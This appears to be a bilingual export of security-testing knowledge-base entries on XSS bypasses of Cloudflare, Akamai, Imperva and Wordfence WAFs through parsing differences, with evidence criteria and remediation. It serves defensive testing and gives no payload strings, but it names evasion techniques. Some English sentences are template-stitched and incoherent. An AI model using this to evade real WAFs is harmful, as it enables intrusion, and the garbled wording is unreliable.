title.zh: 修复并回归“结构闭合型 XSS Polyglot 集合”
title.en: Retest the Structural-Breakout XSS Polyglot Set remediation boundary

description.zh: 由模板引擎在最终上下文自动转义，禁止组件重复解码，并对富 HTML 采用命名空间感知消毒器与 Trusted Types；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the minimal state-specific breakout prefix, generated node, and execution event can all be explained from the final DOM rather than retaining an unexplained long string no longer appears.

review.rationale: 结构闭合型 XSS Polyglot 集合保留为 Payload，用于审查“组合闭合序列是否把 tokenizer 从 RCDATA、RAWTEXT、属性值或外来内容状态切换到可创建事件节点的状态”。成立时必须满足证据要求“解析器状态对应的最小闭合前缀、生成节点和执行事件均可从最终 DOM 解释，避免保留无法说明原因的超长字符串”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 已定位 title、style、textarea、script、属性或 MathML/SVG 中的确切 HTML tokenizer 状态与模板包裹字符。
prerequisites.en: The exact HTML tokenizer state and template wrapper characters are identified for title, style, textarea, script, attribute, or MathML and SVG contexts.

prerequisites.zh: 每轮从 polyglot 缩减为一个结构闭合假设，使用固定 marker，并保存响应源码、tokenizer trace 与解析后 DOM。
prerequisites.en: Each run minimizes the polyglot to one structural-breakout hypothesis, uses a fixed marker, and preserves response source, tokenizer trace, and parsed DOM.

analysis.zh: 阳性证据是输入关闭目标原始 tokenizer 状态，建立活动元素或事件属性并执行 marker；必须报告具体闭合片段而非整条 polyglot。 假阳性边界：复杂字符串回显、浏览器错误恢复生成不同 DOM、部分标签被丢弃、仅在另一个上下文可执行或 WAF 放行均是假阳性。
analysis.en: Positive evidence requires the input to close the original tokenizer state, create an active element or event attribute, and execute the marker, with the exact breakout fragment reported rather than the whole polyglot. False-positive boundary: Reflection of a complex string, browser error recovery into a different inert DOM, dropped tags, execution only in another context, or WAF allowance is a false positive.

opsecTips.zh: 结构闭合测试每次只针对一个 tokenizer 状态；出现整个页面截断、表单结构破坏、事件循环、外连或导航时停止。
opsecTips.en: Structural-breakout testing targets one tokenizer state per run; stop on page truncation, damaged form structure, event loops, egress, or navigation.

opsecTips.zh: 删除 polyglot 记录和 DOM fixture，清理模板/页面缓存，恢复原包裹结构并用合法 title/style/textarea 内容回归。
opsecTips.en: Delete polyglot records and DOM fixtures, clear template and page caches, restore original wrappers, and regress with valid title, style, and textarea content.

name.zh: Cloudflare WAF XSS 解析差异

description.zh: 使用事件、SVG、字符引用与 MathML 等变体对照 Cloudflare 托管规则、源站解码和浏览器解析，验证真实 XSS 而非单纯放行。
description.en: Compares event, SVG, character-reference, and MathML variants across Cloudflare managed rules, origin decoding, and browser parsing to prove real XSS rather than simple acceptance.

overview.zh: Cloudflare WAF XSS 解析差异评估边缘防护、源站和浏览器之间的解析差异，而不是把 WAF 放行视为成功。需要核对的行为为：Cloudflare 规则集与浏览器对混合大小写、实体编码、外来内容和事件属性是否产生不同解析结果。成立前提为：规则版本或自定义跳过规则未覆盖实际参数，源站继续把被放行值输出到可执行 HTML 上下文。最终必须取得以下证据：Cloudflare 安全事件、Ray ID、源站日志、最终 DOM 与唯一执行标记能够逐请求关联。
overview.en: Cloudflare WAF XSS Parsing Differential checks whether Cloudflare rules and the browser derive different results from mixed case, entity encoding, foreign content, and event attributes. It applies when the active rule version or a custom skip rule does not inspect the relevant parameter and the origin still emits the accepted value into an executable HTML context. A conclusion requires Cloudflare security events, Ray ID, origin logs, final DOM, and a unique execution marker correlate per request; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 多层处理出现风险的前提为：规则版本或自定义跳过规则未覆盖实际参数，源站继续把被放行值输出到可执行 HTML 上下文。审计应使用同一请求标识关联边缘动作、源站接收字节、应用输出与浏览器结果，并据此判断“Cloudflare 规则集与浏览器对混合大小写、实体编码、外来内容和事件属性是否产生不同解析结果”。只有 200 响应、告警缺失或规则未命中均不足以证明 XSS。
vulnerability.en: The risk exists when the active rule version or a custom skip rule does not inspect the relevant parameter and the origin still emits the accepted value into an executable HTML context, allowing whether Cloudflare rules and the browser derive different results from mixed case, entity encoding, foreign content, and event attributes. Review the input source, final parsing context, browser or policy version, and Cloudflare security events, Ray ID, origin logs, final DOM, and a unique execution marker correlate per request; otherwise record only an unconfirmed control differential.

exploitation.zh: 固定规则集和浏览器版本，对每个变体记录阻断、挑战或放行动作；仅对放行项在隔离页面复核 DOM 与执行，不进行高频批量探测。固定 WAF 规则集、源站版本与浏览器版本，先重放未编码基线，再逐类测试大小写、实体、空白或结构变化；命中后缩减为单一变换，并按“Cloudflare 安全事件、Ray ID、源站日志、最终 DOM 与唯一执行标记能够逐请求关联”完成确认。
exploitation.en: In an authorized isolated environment, pin the ruleset and browser version, record block, challenge, or allow actions per variant, and verify DOM plus execution only for accepted cases in an isolated page without high-rate probing. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 升级并调优 Cloudflare 托管规则，删除不必要的跳过条件，同时在源站统一解码、按上下文编码并部署严格 CSP。修复同时覆盖边缘规则和最终应用 sink，再使用相同请求标识重放正常与异常样例，确认 WAF 动作、源站规范化和浏览器 DOM 三层结果一致。
mitigation.en: Remediation should update and tune Cloudflare managed rules, remove unnecessary skip conditions, and still canonicalize once, encode by context, and deploy strict CSP at the origin. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 固定“Cloudflare WAF XSS 解析差异”处理链版本
title.en: Scope the Cloudflare WAF XSS Parsing Differential data flow

description.zh: 记录边缘规则、文本转换顺序、源站框架与浏览器版本，并界定前提“规则版本或自定义跳过规则未覆盖实际参数，源站继续把被放行值输出到可执行 HTML 上下文”的实际范围。
description.en: Trace the real input to the final sink or policy decision, confirm that the active rule version or a custom skip rule does not inspect the relevant parameter and the origin still emits the accepted value into an executable HTML context, and record browser, response-header, and relevant component versions.

title.zh: 关联“Cloudflare WAF 差异测试”多层基线
title.en: Establish the Cloudflare WAF Differential Testing baseline

description.zh: 使用请求 ID 关联 WAF 动作、源站接收值和响应 DOM，并以“Cloudflare 安全事件、Ray ID、源站日志、最终 DOM 与唯一执行标记能够逐请求关联”作为最终证据要求。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only Cloudflare security events, Ray ID, origin logs, final DOM, and a unique execution marker correlate per request as valid evidence.

title.zh: 逐变换验证“Cloudflare WAF XSS 解析差异”
title.en: Run a single-variable Cloudflare WAF XSS Parsing Differential check

description.zh: 固定规则集和浏览器版本，对每个变体记录阻断、挑战或放行动作；仅对放行项在隔离页面复核 DOM 与执行，不进行高频批量探测；每轮只改变一种编码或语法形式，并将命中项缩减到可解释的最小差异。
description.en: pin the ruleset and browser version, record block, challenge, or allow actions per variant, and verify DOM plus execution only for accepted cases in an isolated page without high-rate probing; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

title.zh: 统一规范化并回归
title.en: Retest the Cloudflare WAF XSS Parsing Differential remediation boundary

description.zh: 升级并调优 Cloudflare 托管规则，删除不必要的跳过条件，同时在源站统一解码、按上下文编码并部署严格 CSP；重放相同请求集，确认边缘、源站和浏览器对输入形成一致且安全的结果。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while Cloudflare security events, Ray ID, origin logs, final DOM, and a unique execution marker correlate per request no longer appears.

review.rationale: Cloudflare WAF XSS 解析差异保留为 Payload，用于审查“Cloudflare 规则集与浏览器对混合大小写、实体编码、外来内容和事件属性是否产生不同解析结果”。成立时必须满足证据要求“Cloudflare 安全事件、Ray ID、源站日志、最终 DOM 与唯一执行标记能够逐请求关联”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 测试请求经过目标 Cloudflare zone、当前托管规则与转换后到达自有源站，且没有使用直连源站或管理员跳过规则。
prerequisites.en: Test requests traverse the target Cloudflare zone, current managed rules, and transformations to an owned origin without direct-origin access or administrator bypass.

prerequisites.zh: Cloudflare event、源站日志、响应字节和浏览器 DOM 以唯一请求令牌关联，并准备阻断与正常基线。
prerequisites.en: Cloudflare events, origin logs, response bytes, and browser DOM are correlated by a unique request token, with blocked and benign baselines prepared.

analysis.zh: 阳性证据是变体穿过实际 Cloudflare 规则，源站在活动上下文输出后由浏览器执行 marker；放行、输出和执行三段必须连续。 假阳性边界：Cloudflare 返回 200/challenge、只隐藏告警、源站编码、浏览器生成惰性节点、缓存旧页面或直接源站成功都不是 WAF XSS 绕过。
analysis.en: Positive evidence requires a variant to pass the real Cloudflare rules, be emitted by the origin into an active context, and execute the browser marker, preserving the allow, output, and execution chain. False-positive boundary: A Cloudflare HTTP 200 or challenge, hidden alerts only, origin encoding, an inert browser node, a cached old page, or direct-origin success is not a WAF XSS bypass.

opsecTips.zh: Cloudflare 差异测试仅限专用 URL 与速率；发现生产缓存、真实访客、Bot 管理升级、规则变化或源站异常时停止。
opsecTips.en: Cloudflare differential testing is limited to a dedicated URL and rate; stop on production cache involvement, real visitors, bot escalation, rule changes, or origin anomalies.

opsecTips.zh: 撤销测试规则/跳过项，清除专用缓存与测试页面，删除 edge/origin 调试日志和 marker，再重放正常与阻断基线。
opsecTips.en: Revert test rules and skips, purge dedicated caches and test pages, delete edge and origin debug logs plus markers, then replay benign and blocked baselines.

name.zh: Akamai App & API Protector XSS 差异
name.en: Akamai App and API Protector XSS Differential

description.zh: 针对 SVG、焦点事件和媒体错误事件等短样例，核对 Akamai 防护策略与源站 HTML 输出之间的检测差异。
description.en: Uses compact SVG, focus-event, and media-error samples to compare Akamai protection policy decisions with the origin HTML output.

overview.zh: Akamai App & API Protector XSS 差异评估边缘防护、源站和浏览器之间的解析差异，而不是把 WAF 放行视为成功。需要核对的行为为：Akamai 策略对自动焦点、媒体错误和 SVG onload 等事件入口的检测是否与最终浏览器事件模型一致。成立前提为：生产策略处于告警模式、例外范围过宽或参数解析不完整，并且源站允许事件属性进入 HTML。最终必须取得以下证据：Akamai 请求参考、策略动作、源站接收值和实际事件触发标记四项信息必须对应同一请求。
overview.en: Akamai App and API Protector XSS Differential checks whether Akamai policy detection for autofocus, media errors, and SVG onload matches the browser's final event model. It applies when the production policy is in alert mode, exceptions are too broad, or parameter parsing is incomplete while the origin permits event attributes in HTML. A conclusion requires the Akamai request reference, policy action, origin-received value, and actual event marker must correspond to one request; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 多层处理出现风险的前提为：生产策略处于告警模式、例外范围过宽或参数解析不完整，并且源站允许事件属性进入 HTML。审计应使用同一请求标识关联边缘动作、源站接收字节、应用输出与浏览器结果，并据此判断“Akamai 策略对自动焦点、媒体错误和 SVG onload 等事件入口的检测是否与最终浏览器事件模型一致”。只有 200 响应、告警缺失或规则未命中均不足以证明 XSS。
vulnerability.en: The risk exists when the production policy is in alert mode, exceptions are too broad, or parameter parsing is incomplete while the origin permits event attributes in HTML, allowing whether Akamai policy detection for autofocus, media errors, and SVG onload matches the browser's final event model. Review the input source, final parsing context, browser or policy version, and the Akamai request reference, policy action, origin-received value, and actual event marker must correspond to one request; otherwise record only an unconfirmed control differential.

exploitation.zh: 在测试配置中逐条发送原样例，区分无需交互、需要焦点和依赖错误事件的触发条件，记录策略动作后才在隔离浏览器复核。固定 WAF 规则集、源站版本与浏览器版本，先重放未编码基线，再逐类测试大小写、实体、空白或结构变化；命中后缩减为单一变换，并按“Akamai 请求参考、策略动作、源站接收值和实际事件触发标记四项信息必须对应同一请求”完成确认。
exploitation.en: In an authorized isolated environment, send each original sample against a test configuration, separate automatic, focus-dependent, and error-dependent triggers, record the policy action, and only then verify in an isolated browser. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 将相关保护策略设为阻断并收紧例外和参数范围；源站应移除事件属性、执行上下文编码并以 CSP 限制脚本来源。修复同时覆盖边缘规则和最终应用 sink，再使用相同请求标识重放正常与异常样例，确认 WAF 动作、源站规范化和浏览器 DOM 三层结果一致。
mitigation.en: Remediation should place the relevant protection policy in blocking mode, narrow exceptions and parameter scope, and remove event attributes, encode output contexts, and restrict script sources at the origin. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 固定“Akamai App & API Protector XSS 差异”处理链版本
title.en: Scope the Akamai App and API Protector XSS Differential data flow

description.zh: 记录边缘规则、文本转换顺序、源站框架与浏览器版本，并界定前提“生产策略处于告警模式、例外范围过宽或参数解析不完整，并且源站允许事件属性进入 HTML”的实际范围。
description.en: Trace the real input to the final sink or policy decision, confirm that the production policy is in alert mode, exceptions are too broad, or parameter parsing is incomplete while the origin permits event attributes in HTML, and record browser, response-header, and relevant component versions.

title.zh: 关联“Akamai WAF 差异测试”多层基线
title.en: Establish the Akamai WAF Differential Testing baseline

description.zh: 使用请求 ID 关联 WAF 动作、源站接收值和响应 DOM，并以“Akamai 请求参考、策略动作、源站接收值和实际事件触发标记四项信息必须对应同一请求”作为最终证据要求。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the Akamai request reference, policy action, origin-received value, and actual event marker must correspond to one request as valid evidence.

title.zh: 逐变换验证“Akamai App & API Protector XSS 差异”
title.en: Run a single-variable Akamai App and API Protector XSS Differential check

description.zh: 在测试配置中逐条发送原样例，区分无需交互、需要焦点和依赖错误事件的触发条件，记录策略动作后才在隔离浏览器复核；每轮只改变一种编码或语法形式，并将命中项缩减到可解释的最小差异。
description.en: send each original sample against a test configuration, separate automatic, focus-dependent, and error-dependent triggers, record the policy action, and only then verify in an isolated browser; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

title.zh: 统一规范化并回归
title.en: Retest the Akamai App and API Protector XSS Differential remediation boundary

description.zh: 将相关保护策略设为阻断并收紧例外和参数范围；源站应移除事件属性、执行上下文编码并以 CSP 限制脚本来源；重放相同请求集，确认边缘、源站和浏览器对输入形成一致且安全的结果。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the Akamai request reference, policy action, origin-received value, and actual event marker must correspond to one request no longer appears.

review.rationale: Akamai App & API Protector XSS 差异保留为 Payload，用于审查“Akamai 策略对自动焦点、媒体错误和 SVG onload 等事件入口的检测是否与最终浏览器事件模型一致”。成立时必须满足证据要求“Akamai 请求参考、策略动作、源站接收值和实际事件触发标记四项信息必须对应同一请求”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 请求通过目标 Akamai property 和 App & API Protector policy 到达测试源，安全配置版本、行为链和缓存状态已固定。
prerequisites.en: Requests pass through the target Akamai property and App and API Protector policy to a test origin, with security configuration version, behavior chain, and cache state fixed.

prerequisites.zh: Akamai security event、源站收到值、HTML 输出和目标浏览器事件调用栈使用同一测试令牌，并有规则阻断对照。
prerequisites.en: Akamai security events, origin-received values, HTML output, and target-browser event call stacks share one test token, with a rule-blocked control.

analysis.zh: 阳性证据是短 SVG/焦点/媒体事件变体绕过当前 Akamai policy，源站未安全编码并由对应浏览器事件执行 marker。 假阳性边界：安全事件未生成、请求获准、源站返回错误、事件属性存在但不触发、不同 Akamai 配置或直连源站结果均不能证明绕过。
analysis.en: Positive evidence requires a short SVG, focus, or media-event variant to pass the current Akamai policy, remain unencoded at the origin, and execute the marker through the corresponding browser event. False-positive boundary: No security event, an allowed request, an origin error, an event attribute that never fires, a different Akamai configuration, or direct-origin behavior does not prove bypass.

opsecTips.zh: Akamai 差异测试只在 staging property/路径低频执行；发现生产行为发布、真实缓存键、用户事件或源站延迟时立即停止。
opsecTips.en: Akamai differential testing runs at low rate on a staging property or path only; stop on production behavior activation, real cache keys, user events, or origin latency.

opsecTips.zh: 回滚临时安全配置，清除测试 CP code/path 缓存，删除源站记录与事件 marker，并确认激活版本恢复后基线一致。
opsecTips.en: Roll back temporary security configuration, purge test CP-code or path caches, delete origin records and event markers, and confirm baselines after the active version is restored.

name.zh: Imperva Cloud WAF 活动文档差异

description.zh: 围绕 data URL、srcdoc、object、embed 与旧式 link import，验证 Imperva Cloud WAF 是否与浏览器活动文档处理保持一致。
description.en: Tests whether Imperva Cloud WAF matches browser handling of active documents delivered through data URLs, srcdoc, object, embed, and legacy link imports.

overview.zh: Imperva Cloud WAF 活动文档差异评估边缘防护、源站和浏览器之间的解析差异，而不是把 WAF 放行视为成功。需要核对的行为为：边缘规则是否理解嵌套 HTML 文档载体及其 MIME 和 CSP 约束，还是只匹配外层标签名称。成立前提为：Imperva 策略允许含活动文档的属性通过，源站不消毒 object、embed、iframe srcdoc 等元素，且浏览器支持相应载体。最终必须取得以下证据：Imperva 事件 ID、最终元素属性、嵌套文档 origin 与唯一执行标记完整记录，已废弃 link import 不应算成功。
overview.en: Imperva Cloud WAF Active-Document Differential checks whether edge rules understand nested HTML document carriers and their MIME and CSP constraints or only match outer tag names. It applies when Imperva policy accepts attributes containing active documents, the origin does not sanitize object, embed, or iframe srcdoc elements, and the browser supports the carrier. A conclusion requires the Imperva event ID, final element attribute, nested-document origin, and unique marker are recorded, while obsolete link imports are not counted as success; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 多层处理出现风险的前提为：Imperva 策略允许含活动文档的属性通过，源站不消毒 object、embed、iframe srcdoc 等元素，且浏览器支持相应载体。审计应使用同一请求标识关联边缘动作、源站接收字节、应用输出与浏览器结果，并据此判断“边缘规则是否理解嵌套 HTML 文档载体及其 MIME 和 CSP 约束，还是只匹配外层标签名称”。只有 200 响应、告警缺失或规则未命中均不足以证明 XSS。
vulnerability.en: The risk exists when Imperva policy accepts attributes containing active documents, the origin does not sanitize object, embed, or iframe srcdoc elements, and the browser supports the carrier, allowing whether edge rules understand nested HTML document carriers and their MIME and CSP constraints or only match outer tag names. Review the input source, final parsing context, browser or policy version, and the Imperva event ID, final element attribute, nested-document origin, and unique marker are recorded, while obsolete link imports are not counted as success; otherwise record only an unconfirmed control differential.

exploitation.zh: 先确认目标浏览器对每种载体的支持，再向测试策略提交原集合；分开记录 WAF 放行、资源加载与嵌套脚本执行三个阶段。固定 WAF 规则集、源站版本与浏览器版本，先重放未编码基线，再逐类测试大小写、实体、空白或结构变化；命中后缩减为单一变换，并按“Imperva 事件 ID、最终元素属性、嵌套文档 origin 与唯一执行标记完整记录，已废弃 link import 不应算成功”完成确认。
exploitation.en: In an authorized isolated environment, confirm browser support for every carrier before submitting the original set to a test policy, and record WAF acceptance, resource loading, and nested script execution as separate stages. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 在 Imperva 中启用并调优 XSS 防护，但以源站 HTML 消毒移除活动文档元素为主；同时设置 object-src none、frame-src 和严格脚本策略。修复同时覆盖边缘规则和最终应用 sink，再使用相同请求标识重放正常与异常样例，确认 WAF 动作、源站规范化和浏览器 DOM 三层结果一致。
mitigation.en: Remediation should enable and tune Imperva XSS protection while relying primarily on origin HTML sanitization to remove active-document elements, plus object-src none, precise frame-src, and a strict script policy. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 固定“Imperva Cloud WAF 活动文档差异”处理链版本
title.en: Scope the Imperva Cloud WAF Active-Document Differential data flow

description.zh: 记录边缘规则、文本转换顺序、源站框架与浏览器版本，并界定前提“Imperva 策略允许含活动文档的属性通过，源站不消毒 object、embed、iframe srcdoc 等元素，且浏览器支持相应载体”的实际范围。
description.en: Trace the real input to the final sink or policy decision, confirm that Imperva policy accepts attributes containing active documents, the origin does not sanitize object, embed, or iframe srcdoc elements, and the browser supports the carrier, and record browser, response-header, and relevant component versions.

title.zh: 关联“Imperva WAF 差异测试”多层基线
title.en: Establish the Imperva WAF Differential Testing baseline

description.zh: 使用请求 ID 关联 WAF 动作、源站接收值和响应 DOM，并以“Imperva 事件 ID、最终元素属性、嵌套文档 origin 与唯一执行标记完整记录，已废弃 link import 不应算成功”作为最终证据要求。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the Imperva event ID, final element attribute, nested-document origin, and unique marker are recorded, while obsolete link imports are not counted as success as valid evidence.

title.zh: 逐变换验证“Imperva Cloud WAF 活动文档差异”
title.en: Run a single-variable Imperva Cloud WAF Active-Document Differential check

description.zh: 先确认目标浏览器对每种载体的支持，再向测试策略提交原集合；分开记录 WAF 放行、资源加载与嵌套脚本执行三个阶段；每轮只改变一种编码或语法形式，并将命中项缩减到可解释的最小差异。
description.en: confirm browser support for every carrier before submitting the original set to a test policy, and record WAF acceptance, resource loading, and nested script execution as separate stages; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload: XSS

title.zh: 统一规范化并回归
title.en: Retest the Imperva Cloud WAF Active-Document Differential remediation boundary

description.zh: 在 Imperva 中启用并调优 XSS 防护，但以源站 HTML 消毒移除活动文档元素为主；同时设置 object-src none、frame-src 和严格脚本策略；重放相同请求集，确认边缘、源站和浏览器对输入形成一致且安全的结果。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the Imperva event ID, final element attribute, nested-document origin, and unique marker are recorded, while obsolete link imports are not counted as success no longer appears.

review.rationale: Imperva Cloud WAF 活动文档差异保留为 Payload，用于审查“边缘规则是否理解嵌套 HTML 文档载体及其 MIME 和 CSP 约束，还是只匹配外层标签名称”。成立时必须满足证据要求“Imperva 事件 ID、最终元素属性、嵌套文档 origin 与唯一执行标记完整记录，已废弃 link import 不应算成功”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 测试流量经过目标 Imperva Cloud WAF site/policy，源站会把输入放入允许 iframe、object、embed 或 link 的活动文档上下文。
prerequisites.en: Test traffic passes through the target Imperva Cloud WAF site and policy, and the origin places input into an active-document context that permits iframe, object, embed, or link.

prerequisites.zh: 目标浏览器、MIME、CSP、frame/object 限制和 Imperva/源站日志已记录，data/srcdoc 内容只调用固定 marker。
prerequisites.en: Target browser, MIME, CSP, frame and object restrictions, plus Imperva and origin logs are recorded, and data or srcdoc content calls only a fixed marker.

analysis.zh: 阳性证据是变体通过实际 Imperva policy，浏览器将 data/srcdoc/object/embed 内容作为活动文档处理并执行 marker，执行来源和容器类型明确。 假阳性边界：资源 URL 被请求、文件下载、MIME 或 frame/CSP 阻止、元素在 DOM 中但文档不活动，或只在直连源站执行都不是完整绕过。
analysis.en: Positive evidence requires a variant to pass the real Imperva policy and the browser to process data, srcdoc, object, or embed content as an active document that executes the marker, with origin and container type identified. False-positive boundary: A requested resource URL, file download, MIME or frame and CSP blocking, a DOM element with an inactive document, or direct-origin-only execution is not a complete bypass.

opsecTips.zh: Imperva 活动文档测试只加载本地空内容；出现顶层导航、插件调用、下载、跨源读取、公共网络请求或生产规则变化时停止。
opsecTips.en: Imperva active-document testing loads local empty content only; stop on top-level navigation, plugin invocation, downloads, cross-origin reads, public network requests, or production-rule changes.

opsecTips.zh: 移除 iframe/object/embed/link 节点与 data/srcdoc 测试页，清理 Imperva/浏览器缓存和日志，恢复 policy 后重载。
opsecTips.en: Remove iframe, object, embed, and link nodes plus data or srcdoc test pages, clear Imperva and browser caches and logs, restore the policy, and reload.

name.zh: Wordfence WAF 动态求值差异

description.zh: 比较 javascript URL、属性拼接、字符串定时器、Function 与 eval 等形式在 WordPress、Wordfence 和浏览器中的处理差异。
description.en: Compares javascript URLs, property concatenation, string timers, Function, and eval across WordPress, Wordfence, and browser processing.

overview.zh: Wordfence WAF 动态求值差异评估边缘防护、源站和浏览器之间的解析差异，而不是把 WAF 放行视为成功。需要核对的行为为：Wordfence 规则对动态重建和求值语法的覆盖是否与 WordPress 输出过滤及浏览器执行结果一致。成立前提为：插件或主题把可控值原样输出，Wordfence 处于学习或例外模式，且页面 CSP 允许内联脚本或 unsafe-eval。最终必须取得以下证据：Wordfence 实时流量记录、命中规则、WordPress 模板位置、最终 DOM 与唯一执行标记必须相互对应。
overview.en: Wordfence WAF Dynamic-Evaluation Differential checks whether Wordfence coverage of runtime reconstruction and evaluation syntax matches WordPress output filtering and browser execution. It applies when a plugin or theme emits a controllable value raw, Wordfence is learning or bypassed by an exception, and page CSP permits inline script or unsafe-eval. A conclusion requires Wordfence live-traffic data, matched rule, WordPress template location, final DOM, and unique marker must correlate; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 多层处理出现风险的前提为：插件或主题把可控值原样输出，Wordfence 处于学习或例外模式，且页面 CSP 允许内联脚本或 unsafe-eval。审计应使用同一请求标识关联边缘动作、源站接收字节、应用输出与浏览器结果，并据此判断“Wordfence 规则对动态重建和求值语法的覆盖是否与 WordPress 输出过滤及浏览器执行结果一致”。只有 200 响应、告警缺失或规则未命中均不足以证明 XSS。
vulnerability.en: The risk exists when a plugin or theme emits a controllable value raw, Wordfence is learning or bypassed by an exception, and page CSP permits inline script or unsafe-eval, allowing whether Wordfence coverage of runtime reconstruction and evaluation syntax matches WordPress output filtering and browser execution. Review the input source, final parsing context, browser or policy version, and Wordfence live-traffic data, matched rule, WordPress template location, final DOM, and unique marker must correlate; otherwise record only an unconfirmed control differential.

exploitation.zh: 在测试站点固定 WordPress、插件和规则版本，逐类比较直接调用与动态重建变体；先确认模板 sink，再评价 WAF 差异。固定 WAF 规则集、源站版本与浏览器版本，先重放未编码基线，再逐类测试大小写、实体、空白或结构变化；命中后缩减为单一变换，并按“Wordfence 实时流量记录、命中规则、WordPress 模板位置、最终 DOM 与唯一执行标记必须相互对应”完成确认。
exploitation.en: In an authorized isolated environment, pin WordPress, plugin, and ruleset versions on a test site, compare direct calls with runtime reconstruction by class, and confirm the template sink before assessing WAF differences. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 更新 Wordfence 与易受影响插件主题，移除宽泛允许规则；开发代码应使用 esc_html、esc_attr 等匹配上下文的 WordPress 转义 API。修复同时覆盖边缘规则和最终应用 sink，再使用相同请求标识重放正常与异常样例，确认 WAF 动作、源站规范化和浏览器 DOM 三层结果一致。
mitigation.en: Remediation should update Wordfence and affected plugins or themes, remove broad allow rules, and use WordPress context-specific escaping APIs such as esc_html and esc_attr in application code. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 固定“Wordfence WAF 动态求值差异”处理链版本
title.en: Scope the Wordfence WAF Dynamic-Evaluation Differential data flow

description.zh: 记录边缘规则、文本转换顺序、源站框架与浏览器版本，并界定前提“插件或主题把可控值原样输出，Wordfence 处于学习或例外模式，且页面 CSP 允许内联脚本或 unsafe-eval”的实际范围。
description.en: Trace the real input to the final sink or policy decision, confirm that a plugin or theme emits a controllable value raw, Wordfence is learning or bypassed by an exception, and page CSP permits inline script or unsafe-eval, and record browser, response-header, and relevant component versions.

title.zh: 关联“Wordfence WAF 差异测试”多层基线
title.en: Establish the Wordfence WAF Differential Testing baseline

description.zh: 使用请求 ID 关联 WAF 动作、源站接收值和响应 DOM，并以“Wordfence 实时流量记录、命中规则、WordPress 模板位置、最终 DOM 与唯一执行标记必须相互对应”作为最终证据要求。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only Wordfence live-traffic data, matched rule, WordPress template location, final DOM, and unique marker must correlate as valid evidence.

title.zh: 逐变换验证“Wordfence WAF 动态求值差异”
title.en: Run a single-variable Wordfence WAF Dynamic-Evaluation Differential check

description.zh: 在测试站点固定 WordPress、插件和规则版本，逐类比较直接调用与动态重建变体；先确认模板 sink，再评价 WAF 差异；每轮只改变一种编码或语法形式，并将命中项缩减到可解释的最小差异。
description.en: pin WordPress, plugin, and ruleset versions on a test site, compare direct calls with runtime reconstruction by class, and confirm the template sink before assessing WAF differences; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload: XSS

title.zh: 统一规范化并回归
title.en: Retest the Wordfence WAF Dynamic-Evaluation Differential remediation boundary

description.zh: 更新 Wordfence 与易受影响插件主题，移除宽泛允许规则；开发代码应使用 esc_html、esc_attr 等匹配上下文的 WordPress 转义 API；重放相同请求集，确认边缘、源站和浏览器对输入形成一致且安全的结果。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while Wordfence live-traffic data, matched rule, WordPress template location, final DOM, and unique marker must correlate no longer appears.

review.rationale: Wordfence WAF 动态求值差异保留为 Payload，用于审查“Wordfence 规则对动态重建和求值语法的覆盖是否与 WordPress 输出过滤及浏览器执行结果一致”。成立时必须满足证据要求“Wordfence 实时流量记录、命中规则、WordPress 模板位置、最终 DOM 与唯一执行标记必须相互对应”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 请求经过目标 WordPress 入口和已启用 Wordfence WAF，插件/规则版本已记录，输入随后进入真实可执行 HTML 或 JavaScript sink。
prerequisites.en: Requests traverse the target WordPress entry and enabled Wordfence WAF, with plugin and rule versions recorded, and input subsequently reaches a real executable HTML or JavaScript sink.

prerequisites.zh: 使用最低权限测试账户和隔离文章/页面，Wordfence live traffic、PHP 输出、DOM 与动态求值调用以唯一 marker 关联。
prerequisites.en: A least-privilege test account and isolated post or page are used, with Wordfence live traffic, PHP output, DOM, and dynamic-evaluation calls correlated by a unique marker.

